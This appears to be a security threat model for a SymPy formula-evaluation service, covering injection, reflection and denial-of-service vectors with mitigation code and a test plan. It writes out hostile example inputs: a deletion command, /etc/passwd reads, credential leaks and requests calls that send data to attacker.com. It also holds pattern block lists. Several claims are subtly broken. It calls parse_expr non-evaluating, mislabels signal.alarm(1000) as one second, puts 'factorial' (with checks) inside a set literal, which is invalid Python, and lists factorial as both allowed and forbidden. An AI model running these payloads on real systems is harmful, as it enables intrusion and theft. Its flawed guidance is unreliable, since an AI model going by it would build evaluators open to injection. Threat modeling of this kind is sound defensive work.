# PHASE 2 — STAGE 2: SECURE FORMULA EXECUTOR
## Security Threat Model & Analysis

**Date:** 2026-05-09  
**Phase:** Security Research & Threat Modeling  
**Status:** IN PROGRESS

---

## EXECUTIVE SUMMARY

**Task:** Design production-grade formula executor that prevents code execution, injection attacks, resource exhaustion, and malicious expressions.

**Key Risks (Critical):**
1. SymPy code injection via `sympify()`
2. Arbitrary Python code execution
3. Infinite recursion / stack overflow
4. Memory exhaustion attacks
5. File/network access exploitation

**Mitigation:** 3-layer security model (Input Validation → Operation Whitelist → Execution Sandbox)

---

## SECTION 1: SYMPY SECURITY FUNDAMENTALS

### What is SymPy?

**SymPy** = Symbolic mathematics library for Python

```python
import sympy as sp

# Basic usage
expr = sp.sympify("x**2 + 2*x + 1")  # Parse expression
result = expr.subs({"x": 5})  # Substitute values
```

### Why is SymPy a Security Risk?

**Problem:** `sp.sympify()` can execute arbitrary Python code.

```python
# SAFE
sympify("x + 1")  # Just math

# DANGEROUS
sympify("__import__('os').system('rm -rf /')")
# ↑ This executes code!

sympify("().__class__.__bases__[0].__subclasses__()")
# ↑ This accesses Python internals!

sympify("eval('open(\"/etc/passwd\").read()')")
# ↑ This reads files!
```

### The Root Cause

**SymPy uses Python's `eval()` internally** in certain evaluation modes.

```python
# Under the hood (simplified)
def sympify(expr, **kwargs):
    # Parses string, may call eval() or exec()
    # DANGEROUS if expr is user-controlled
    return parse_and_evaluate(expr)
```

**Solution:** Use `transformations=sp.parse_expr` (parse-only mode, no evaluation).

---

## SECTION 2: ATTACK SURFACE ANALYSIS

### Attack Vector 1: Code Injection via User Input

**Scenario:**
```python
user_formula = request.json["formula"]  # User input
expr = sympify(user_formula)  # DANGEROUS!
```

**Attacks:**
```python
# Attack 1: System command execution
"__import__('subprocess').run(['echo pwned'])"

# Attack 2: File access
"open('/etc/passwd').read()"

# Attack 3: Network access
"__import__('requests').get('http://attacker.com/leak')"

# Attack 4: Environment variable leaks
"__import__('os').environ.get('DATABASE_URL')"

# Attack 5: Process termination
"exit(1)  # Crash the service"
```

**Risk Level:** 🔴 **CRITICAL**

---

### Attack Vector 2: Reflection & Introspection

**Scenario:** Using Python's introspection to access dangerous APIs

```python
# Getting base class
"x.__class__.__bases__[0].__subclasses__()"

# Accessing __import__
"().__class__.__bases__[0].__subclasses__()[104].__init__.__globals__['__builtins__']['eval']"

# Walking up the MRO (Method Resolution Order)
"type(x).__mro__[1].__subclasses__()"
```

**Risk Level:** 🔴 **CRITICAL**

---

### Attack Vector 3: Resource Exhaustion

**Scenario:** Malicious formulas that consume unbounded resources

```python
# Infinite recursion
"factorial(10**10)"  # Computes factorial of huge number

# Large symbolic expansion
"(x + 1)**(10**10)"  # Expands to massive expression

# Infinite loop (if execution continues)
"while True: pass"  # Blocks forever

# Memory bomb
"[1] * (10**100)"  # Allocates huge array
```

**Risk Level:** 🟡 **HIGH**

---

### Attack Vector 4: Denial of Service (DoS)

**Scenario:** Crash the calculation service

```python
# Stack overflow
"sin(sin(sin(...(sin(x))...)))"  # Deep nesting

# Timeout
"integrate(exp(-x**1000), x)"  # Symbolic integration of hard expression

# Exception bombing
"1/0"  # Division by zero

"log(0)"  # Invalid domain
```

**Risk Level:** 🟡 **HIGH**

---

### Attack Vector 5: Unsupported Operations Abuse

**Scenario:** Using functions/operations not in our whitelist

```python
# Random numbers (non-deterministic)
"random.random()"

# Current time (timing attacks)
"datetime.datetime.now().timestamp()"

# File system
"os.listdir('/')"

# Subprocess
"subprocess.Popen(['ls'])"
```

**Risk Level:** 🟡 **MEDIUM**

---

## SECTION 3: THREAT MODEL (STRIDE)

### Spoofing (Formulas claimed to be something else)

**Threat:** Malicious formula disguised as legitimate calculation

**Example:**
```
Formula claims to calculate "stress"
Actually executes: "__import__('os').system('...')"
```

**Mitigation:**
- Validate formula against expected structure
- Require explicit formula declaration
- Schema validation (STAGE 1 done)

**Risk:** 🟡 **MEDIUM**

---

### Tampering (Modifying formulas at runtime)

**Threat:** Attacker modifies formula in-memory before execution

**Example:**
```python
original = "x + 1"
# Attacker intercepts and changes to "eval(...)"
```

**Mitigation:**
- Read templates from immutable sources
- Hash templates for integrity checking
- Don't accept formulas via API (use templates only)

**Risk:** 🟡 **MEDIUM**

---

### Repudiation (Denying formula execution)

**Threat:** Attacker claims they didn't run a dangerous formula

**Example:**
```
"I didn't submit that formula!"
```

**Mitigation:**
- Full execution logging + tracing
- Immutable audit trail
- STAGE 5 (traceability)

**Risk:** 🟢 **LOW**

---

### Information Disclosure (Leaking secrets/data)

**Threat:** Formula used to leak sensitive information

**Examples:**
```python
# Leak environment variables
"__import__('os').environ"

# Leak database credentials
"__import__('os').environ.get('DATABASE_URL')"

# Read files
"open('/etc/hosts').read()"

# Network exfiltration
"__import__('requests').post('http://attacker.com', data=secret)"
```

**Mitigation:**
- Forbid all imports (Layer 2)
- No file/network access
- No environment variable access
- Sandbox (Layer 3)

**Risk:** 🔴 **CRITICAL**

---

### Denial of Service (Making service unavailable)

**Threat:** Formulas that crash or hang the service

**Examples:**
```python
# Infinite recursion
"factorial(10**10)"

# Timeout
"integrate(x**x, x)"  # Hard symbolic operation

# Memory bomb
"[1] * (10**100)"

# Stack overflow
"max(1, max(2, max(3, ... )))"  # Deep nesting
```

**Mitigation:**
- Timeout (Layer 3, timeout_ms)
- Memory limits
- Recursion depth limits
- Safe operations whitelist (Layer 2)

**Risk:** 🔴 **CRITICAL**

---

### Elevation of Privilege (Gaining unauthorized access)

**Threat:** Formula used to escape sandbox

**Example:**
```
User submits formula → escapes → accesses database directly
```

**Mitigation:**
- No direct API access from formulas
- Read-only database access only
- No subprocess/import access
- Strict sandboxing

**Risk:** 🟡 **HIGH**

---

## SECTION 4: ATTACK VECTORS DETAILED

### Vector A: Direct Code Injection

**How it works:**
```python
# Attacker input
user_input = "__import__('os').system('touch /tmp/pwned')"

# Vulnerable code
expr = sp.sympify(user_input)  # EXECUTES CODE!
```

**Prevention Layers:**

**Layer 1 - Input Validation:**
```python
DANGEROUS_PATTERNS = [
    '__import__', '__class__', '__bases__',
    '__dict__', '__getattribute__', '__setattr__',
    'eval', 'exec', 'compile',
    'open', 'file', 'input', 'raw_input',
    'globals', 'locals', 'vars',
    'getattr', 'setattr', 'delattr',
    'classmethod', 'staticmethod', 'property',
]

def check_injection(formula: str) -> bool:
    for pattern in DANGEROUS_PATTERNS:
        if pattern in formula:
            raise SecurityError(f"Dangerous pattern: {pattern}")
    return True
```

**Layer 2 - Operation Whitelist:**
```python
# Only allow safe math functions
ALLOWED_FUNCTIONS = {
    'sin', 'cos', 'tan', 'asin', 'acos', 'atan', 'atan2',
    'sinh', 'cosh', 'tanh', 'asinh', 'acosh', 'atanh',
    'sqrt', 'exp', 'log', 'log10', 'log2',
    'abs', 'max', 'min', 'pow',
    'pi', 'e', 'euler_gamma', 'I',
}

def check_allowed_functions(expr: sp.Expr) -> bool:
    functions_used = {f.name for f in expr.atoms(sp.Function)}
    undefined = functions_used - ALLOWED_FUNCTIONS
    if undefined:
        raise SecurityError(f"Undefined functions: {undefined}")
    return True
```

**Layer 3 - Sandbox Execution:**
```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Formula evaluation exceeded timeout")

def safe_evaluate(expr, variables, timeout_ms=1000):
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(int(timeout_ms / 1000))  # Set alarm
    try:
        result = expr.subs(variables)
        signal.alarm(0)  # Cancel alarm
        return result
    except TimeoutError:
        raise SecurityError(f"Formula timeout ({timeout_ms}ms)")
```

**Risk After Mitigations:** 🟢 **LOW**

---

### Vector B: Reflection Attack

**How it works:**
```python
# Attacker input
formula = "().__class__.__bases__[0].__subclasses__()"

# This walks up Python's object hierarchy to find dangerous classes
```

**Prevention Layers:**

**Layer 1 - Pattern Detection:**
```python
REFLECTION_PATTERNS = [
    '__class__', '__bases__', '__subclasses__',
    '__dict__', '__mro__', '__init_subclass__',
    '__getattribute__', '__setattr__', '__delattr__',
    'mro()', '__dict__.items()',
]

# Check in input validation phase
```

**Layer 2 - Whitelist (no reflection allowed):**
```python
# Reflection functions not in ALLOWED_FUNCTIONS
# Any function starting with __ is forbidden
```

**Layer 3 - Runtime sandboxing:**
```python
# Even if expression somehow constructs reflection,
# timeout will catch infinite loops
```

**Risk After Mitigations:** 🟢 **LOW**

---

### Vector C: Resource Exhaustion

**How it works:**
```python
# Factorial of huge number
sympify("factorial(10**10)").subs({})  # Tries to compute!

# Exponential expansion
sympify("(x+1)**(10**10)").subs({"x": 1})  # Massive expression
```

**Prevention Layers:**

**Layer 1 - Input Validation:**
```python
# Reject expressions with suspiciously large numbers
import re

def check_number_sizes(formula: str) -> bool:
    large_numbers = re.findall(r'\d{6,}', formula)  # 6+ digit numbers
    if large_numbers:
        raise SecurityError(f"Suspiciously large numbers: {large_numbers}")
    return True
```

**Layer 2 - Function Whitelist:**
```python
# Don't allow factorial (can be explosive)
# Don't allow symbolic integration (can be slow)

DANGEROUS_FUNCTIONS = {
    'factorial', 'binomial',  # Explosive growth
    'integrate', 'summation', 'product',  # Can be slow
}

ALLOWED_FUNCTIONS = ALLOWED_FUNCTIONS - DANGEROUS_FUNCTIONS
```

**Layer 3 - Timeout Sandbox:**
```python
# Timeout kills long-running evaluations
signal.alarm(1000)  # 1 second max
```

**Risk After Mitigations:** 🟡 **MEDIUM** (timeout may not catch all)

---

### Vector D: Unsupported Operations

**How it works:**
```python
# Using functions not in our whitelist
sympify("random.random()").subs({})  # Non-deterministic
```

**Prevention Layers:**

**Layer 1 - Pattern detection:**
```python
# Check for function calls
FORBIDDEN_PATTERNS = ['random.', 'time.', 'os.', 'sys.']
```

**Layer 2 - Function whitelist:**
```python
# Only math functions allowed
# Anything else is forbidden
```

**Risk After Mitigations:** 🟢 **LOW**

---

## SECTION 5: SECURITY MODEL ARCHITECTURE

### 3-Layer Defense

```
Input Formula
    ↓
[LAYER 1: Input Validation]
├─ Pattern detection (injection, reflection, dangerous patterns)
├─ Size limits (string length, number sizes)
├─ Syntax validation (must be valid SymPy)
└─ Block if fails → Raise SecurityError
    ↓
[LAYER 2: Operation Whitelist]
├─ Check allowed functions only
├─ Check allowed symbols
├─ Check no forbidden operations
└─ Block if fails → Raise SecurityError
    ↓
[LAYER 3: Execution Sandbox]
├─ Timeout (max 1000ms execution)
├─ Memory limits (if available)
├─ Exception handling (catch all errors)
└─ Error propagation with context
    ↓
Safe Result
```

### Implementation Structure

```python
class SafeFormulaExecutor:
    def __init__(self):
        self.expression_cache = {}
        self.execution_timeout_ms = 1000
    
    def execute(self, formula_id: str, expression: str, variables: dict) -> float:
        # Layer 1: Input Validation
        self._validate_input(expression)
        
        # Layer 2: Operation Whitelist
        expr = self._parse_and_check(expression)
        
        # Layer 3: Sandbox Execution
        result = self._execute_with_timeout(expr, variables)
        
        return result
```

---

## SECTION 6: DETAILED SECURITY CHECKS

### Check 1: Forbidden Patterns

```python
FORBIDDEN_PATTERNS = {
    # Code execution
    '__import__': 'Code execution via import',
    'eval': 'Arbitrary code execution',
    'exec': 'Arbitrary code execution',
    'compile': 'Code compilation',
    'globals': 'Global namespace access',
    'locals': 'Local namespace access',
    
    # Reflection
    '__class__': 'Class introspection',
    '__bases__': 'Base class access',
    '__subclasses__': 'Subclass enumeration',
    '__dict__': 'Object dictionary access',
    '__mro__': 'Method resolution order',
    '__getattribute__': 'Attribute access override',
    '__setattr__': 'Attribute setting override',
    '__delattr__': 'Attribute deletion override',
    
    # File/Network
    'open': 'File access',
    'file': 'File access (Python 2)',
    'input': 'Input from stdin',
    'raw_input': 'Input from stdin',
    'print': 'Output to stdout',
    
    # Data access
    'getattr': 'Attribute access',
    'setattr': 'Attribute modification',
    'delattr': 'Attribute deletion',
    'vars': 'Variable enumeration',
    
    # Async
    'asyncio': 'Async operations',
    'concurrent': 'Concurrent operations',
    
    # System
    'os': 'Operating system access',
    'sys': 'System access',
    'subprocess': 'Subprocess execution',
}
```

### Check 2: Allowed Functions

```python
ALLOWED_FUNCTIONS = {
    # Trigonometric
    'sin', 'cos', 'tan',
    'asin', 'acos', 'atan', 'atan2',
    'sinh', 'cosh', 'tanh',
    'asinh', 'acosh', 'atanh',
    
    # Logarithmic/Exponential
    'exp', 'log', 'log10', 'log2', 'sqrt',
    
    # Algebraic
    'abs', 'sign', 'pow', 'ceiling', 'floor',
    
    # Special
    'gamma', 'factorial' (with checks),
    'erf', 'erfc',
    
    # Constants
    'pi', 'e', 'euler_gamma', 'I' (imaginary unit),
    
    # Aggregation (use carefully)
    'max', 'min',
}

# NOT allowed (too risky)
FORBIDDEN_FUNCTIONS = {
    'factorial',  # Exponential growth risk
    'integrate',  # Can hang
    'summation',  # Can be slow
    'product',    # Can be slow
    'random',     # Non-deterministic
    'seed',       # RNG control
}
```

### Check 3: Dangerous Number Patterns

```python
# Reject suspiciously large numbers
if re.search(r'\d{8,}', formula):  # 8+ digit numbers
    raise SecurityError("Suspiciously large number")

# Reject scientific notation of large numbers
if re.search(r'\d+e\d{4,}', formula):  # 1e10000 etc
    raise SecurityError("Suspiciously large exponent")
```

### Check 4: Expression Complexity Limits

```python
# SymPy expression tree depth
def get_expression_depth(expr):
    if expr.is_leaf:
        return 1
    return 1 + max(get_expression_depth(arg) for arg in expr.args)

# Reject deep nesting (indicates possible infinite recursion)
if get_expression_depth(expr) > 100:
    raise SecurityError("Expression tree too deep (>100 levels)")
```

---

## SECTION 7: EXECUTION TIMEOUT STRATEGY

### Problem

**SymPy symbolic operations can hang indefinitely:**
```python
# This can take forever
sp.integrate(1/(1+x**10), x)

# This can take forever
sp.simplify((x+y)**1000)
```

### Solution: Timeout Wrapper

**Using `signal.alarm()` (Unix only):**
```python
import signal

def timeout_handler(signum, frame):
    raise TimeoutError("Execution timeout")

def safe_evaluate(expr, variables, timeout_ms=1000):
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(int(timeout_ms / 1000))  # Set alarm in seconds
    
    try:
        result = expr.subs(variables)
        signal.alarm(0)  # Cancel alarm
        return result
    except TimeoutError as e:
        raise ExecutionError(f"Formula execution timeout after {timeout_ms}ms")
```

**Cross-platform: Using threading (alternative):**
```python
import threading

def safe_evaluate_threaded(expr, variables, timeout_ms=1000):
    result = [None]
    error = [None]
    
    def execute():
        try:
            result[0] = expr.subs(variables)
        except Exception as e:
            error[0] = e
    
    thread = threading.Thread(target=execute, daemon=True)
    thread.start()
    thread.join(timeout=timeout_ms / 1000)
    
    if thread.is_alive():
        raise ExecutionError(f"Formula timeout after {timeout_ms}ms")
    
    if error[0]:
        raise error[0]
    
    return result[0]
```

**Default Timeout:** 1000ms (1 second) per formula

---

## SECTION 8: UNIT SYSTEM INTEGRATION

### With Security

**Goal:** Track units safely without compromising security

```python
from pint import UnitRegistry

ureg = UnitRegistry()

def safe_execute_with_units(expr, variables, timeout_ms=1000):
    # Wrap variables in Pint quantities
    wrapped_variables = {}
    for var_id, (value, unit_str) in variables.items():
        try:
            unit = ureg.parse_units(unit_str)
            wrapped_variables[var_id] = value * unit
        except:
            # If unit invalid, reject
            raise SecurityError(f"Invalid unit: {unit_str}")
    
    # Execute (inherently safe due to Pint typing)
    result = safe_evaluate(expr, wrapped_variables, timeout_ms)
    
    # Result has unit attached
    return result.magnitude, str(result.units)
```

**Security benefit:** Pint prevents arithmetic on incompatible units, reducing errors.

---

## SECTION 9: ERROR HANDLING

### Exception Hierarchy

```python
class FormulaExecutionError(Exception):
    """Base error for formula execution."""
    pass

class SecurityError(FormulaExecutionError):
    """Security violation in formula."""
    pass

class ExecutionTimeout(FormulaExecutionError):
    """Formula evaluation exceeded timeout."""
    pass

class InvalidFormula(FormulaExecutionError):
    """Formula is syntactically invalid."""
    pass

class UnknownVariable(FormulaExecutionError):
    """Formula references undefined variable."""
    pass

class DimensionalError(FormulaExecutionError):
    """Unit/dimensional mismatch."""
    pass

class ExecutionError(FormulaExecutionError):
    """General execution error (division by zero, etc)."""
    pass
```

### Error Response

**Never leak details about what failed (don't help attacker):**

```python
# BAD (reveals internals)
{
    "status": "error",
    "error": "Attempting to access __import__",  # Attacker learns what's forbidden
    "formula": original_formula  # Echo input back (helps attacker iterate)
}

# GOOD (generic, secure)
{
    "status": "error",
    "code": "SECURITY_VIOLATION",
    "message": "Formula evaluation failed due to security policy",
    # No formula echo
    # No details about what failed
}
```

---

## SECTION 10: TESTING STRATEGY

### Security Test Categories

**1. Injection Attack Tests (10+)**
```python
test_injection_import()  # __import__('os')
test_injection_eval()    # eval('...')
test_injection_exec()    # exec('...')
test_injection_open()    # open('/etc/passwd')
test_injection_getattr() # getattr(x, '__class__')
test_reflection_class()  # x.__class__
test_reflection_bases()  # x.__bases__
test_reflection_subclasses()  # .__subclasses__()
test_reflection_dict()   # .__dict__
test_reflection_mro()    # .__mro__
```

**2. Resource Exhaustion Tests (8+)**
```python
test_large_number_factorial()  # factorial(10**10)
test_large_exponent()          # (x+1)**(10**10)
test_deep_nesting()            # sin(sin(sin(...)))
test_infinite_recursion()      # f(f(f(...)))
test_memory_bomb()             # [1] * (10**100)
test_timeout_long_integral()   # integrate(hard_expr)
test_stack_overflow()          # max(1, max(2, ...))
```

**3. Functionality Tests (15+)**
```python
test_simple_arithmetic()  # x + 1
test_trigonometry()       # sin(x) + cos(y)
test_sqrt()              # sqrt(x**2)
test_log_exp()           # exp(log(x))
test_unit_propagation()  # (1*m) / (1*s) = 1*m/s
test_variable_substitution()  # x=5 in formula
test_timeout_success()   # Fast formula completes within timeout
test_division_by_zero()  # x/0 returns error (not crash)
test_negative_sqrt()     # sqrt(-1) = i (complex number)
```

**4. Edge Case Tests (10+)**
```python
test_empty_formula()     # ""
test_null_variables()    # No variables provided
test_unicode_formula()   # Formula with unicode chars
test_very_long_formula() # 10KB+ formula string
test_whitespace_handling()  # Formula with extra spaces
test_formula_with_comments()  # # comment in formula
test_division_near_zero() # x / 0.0001
test_log_near_zero()     # log(0.000001)
```

---

## SECTION 11: PERFORMANCE TARGETS

### Latency

| Operation | Target | Note |
|-----------|--------|------|
| Input validation | <1ms | Fast pattern matching |
| Parse formula | <5ms | SymPy sympify |
| Check allowed ops | <2ms | Function set lookup |
| Execute (simple) | <10ms | x + 1 |
| Execute (moderate) | <50ms | sin(x) + cos(y) |
| Execute (complex) | <1000ms | Symbolic operations |

### Memory

| Item | Limit |
|------|-------|
| Formula string | 10 KB max |
| Parsed expression | 1 MB max |
| Expression tree depth | 100 levels max |
| Execution memory | 100 MB limit |

---

## SECTION 12: COMPLIANCE & STANDARDS

### OWASP Top 10

| Risk | Mitigation |
|------|-----------|
| A03:2021 Injection | Input validation + whitelist |
| A04:2021 Insecure Design | Security-first design (3 layers) |
| A05:2021 Security Misconfiguration | Secure defaults (whitelist approach) |
| A06:2021 Vulnerable Components | SymPy version pinning + updates |

### CWE (Common Weakness Enumeration)

- **CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')**
  - Mitigation: No eval(), use parse_expr()

- **CWE-94: Improper Control of Generation of Code ('Code Injection')**
  - Mitigation: Whitelist approach, no code generation

- **CWE-99: Improper Control of Resource Identifiers ('Resource Injection')**
  - Mitigation: No file/network access

- **CWE-674: Uncontrolled Recursion**
  - Mitigation: Timeout + depth limits

---

## CONCLUSION & RECOMMENDATIONS

### Risk Summary

| Attack | Severity | Mitigation | Residual |
|--------|----------|-----------|----------|
| Code injection | CRITICAL | 3-layer defense | LOW |
| Reflection | CRITICAL | Pattern + whitelist | LOW |
| Resource exhaustion | HIGH | Timeout + whitelist | MEDIUM |
| DoS | HIGH | Timeout | MEDIUM |
| Unsupported ops | MEDIUM | Whitelist | LOW |

### Implementation Roadmap

1. **Layer 1:** Input Validation (string pattern checks)
2. **Layer 2:** Operation Whitelist (allowed functions only)
3. **Layer 3:** Timeout Sandbox (execution limit)
4. **Unit Integration:** Pint wrapping
5. **Error Handling:** Secure error messages
6. **Testing:** 43+ security + functionality tests

### Remaining Risks

1. **Floating-point attacks** (precision loss) — Document as limitation
2. **Symbolic simplification timeouts** — Mitigated by timeout
3. **Memory-intensive expressions** — Mitigated by timeout
4. **Thread safety** (parallel execution) — Future concern

---

*End of Threat Model & Security Analysis*
